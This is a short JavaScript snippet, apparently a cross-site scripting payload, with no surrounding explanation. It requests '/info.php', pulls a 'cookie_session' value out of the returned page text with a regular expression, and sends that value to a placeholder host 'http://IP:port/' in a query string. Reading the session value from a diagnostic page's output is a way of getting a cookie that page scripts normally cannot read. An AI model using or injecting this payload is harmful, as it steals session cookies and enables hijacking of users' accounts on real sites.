fetch('/info.php') .then(response => response.text()) .then(text => { cookie = text.match(/cookie_session.{1,2000}/)[0]; fetch('http://IP:port/?c=' + encodeURIComponent(cookie)); });
